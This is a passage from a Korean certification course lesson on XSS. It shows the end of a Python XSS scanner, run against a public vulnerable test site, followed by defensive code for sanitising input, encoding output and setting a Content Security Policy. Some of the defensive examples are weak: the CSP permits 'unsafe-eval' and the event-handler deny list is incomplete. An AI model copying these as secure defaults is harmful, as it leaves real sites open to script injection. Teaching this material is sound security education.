        elif vulnerability['type'].startswith('DOM-based'):
            return vulnerability['url']
        
        return "PoC 생성 불가"

# 사용 예시
if __name__ == "__main__":
    scanner = AdvancedXSSScanner("http://testphp.vulnweb.com")
    
    vulnerabilities = scanner.run_comprehensive_scan()
    
    print(f"\n=== XSS 스캔 결과 ===")
    print(f"총 {len(vulnerabilities)}개의 취약점 발견")
    
    for vuln in vulnerabilities:
        print(f"\n[{vuln['severity']}] {vuln['type']}")
        print(f"파라미터: {vuln.get('parameter', 'N/A')}")
        print(f"페이로드: {vuln['payload'][:100]}...")
        
        # PoC 생성
        poc = scanner.generate_poc(vuln)
        print(f"PoC: {poc}")
        print("-" * 60)
    
    # JSON 형태로 결과 저장
    with open('xss_scan_results.json', 'w', encoding='utf-8') as f:
        json.dump(vulnerabilities, f, indent=2, ensure_ascii=False)
    
    print("\n상세 결과가 'xss_scan_results.json'에 저장되었습니다.")
```

#### XSS 방어 기법

##### 1. 입력값 검증 및 필터링
```javascript
// JavaScript에서 XSS 방지
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}

function validateInput(input, type) {
    const patterns = {
        email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
        alphanumeric: /^[a-zA-Z0-9]+$/,
        safe_text: /^[a-zA-Z0-9\s\.,!?-]+$/
    };
    
    return patterns[type] ? patterns[type].test(input) : false;
}

// 안전한 DOM 조작
function safeSetInnerHTML(element, content) {
    // 텍스트 노드로 설정 (HTML 실행 방지)
    element.textContent = content;
}

function safeSetAttribute(element, attribute, value) {
    // 위험한 속성 차단
    const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus'];
    
    if (dangerousAttrs.includes(attribute.toLowerCase())) {
        throw new Error('위험한 속성입니다: ' + attribute);
    }
    
    element.setAttribute(attribute, value);
}
```

##### 2. 서버사이드 출력 인코딩
```php
<?php
// PHP에서 XSS 방지
function safeOutput($data, $context = 'html') {
    switch ($context) {
        case 'html':
            return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
        
        case 'attribute':
            return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
        
        case 'javascript':
            return json_encode($data);
        
        case 'css':
            return preg_replace('/[^a-zA-Z0-9\-_]/', '', $data);
        
        case 'url':
            return urlencode($data);
        
        default:
            return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    }
}

// 사용 예시
$userInput = $_POST['comment'];
echo "댓글: " . safeOutput($userInput, 'html');

// 자바스크립트 컨텍스트
echo "<script>var username = " . safeOutput($username, 'javascript') . ";</script>";
?>
```

##### 3. Content Security Policy (CSP)
```html
<!-- CSP 헤더를 통한 XSS 방지 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-eval'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data:; 
               connect-src 'self';
               font-src 'self';
               object-src 'none';
               media-src 'self';
               frame-src 'none';">
```

```apache
# Apache에서 CSP 헤더 설정
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; media-src 'self'; frame-src 'none';"
```

## 마무리

이번 18강에서는 **정보 노출과 콘텐츠 보안**의 핵심 취약점들을 다뤘습니다. **디렉토리 인덱싱**, **정보 누출**, **악성 콘텐츠**, **XSS 공격** 등의 위험성과 탐지 방법, 효과적인 방어 기법을 학습했습니다.

다음 강의에서는 **인증 및 세션 보안**에 대해 심화 학습하겠습니다.

---
*이 자료는 해킹보안전문가 1급 자격증 취득을 위한 학습 목적으로 작성되었습니다.*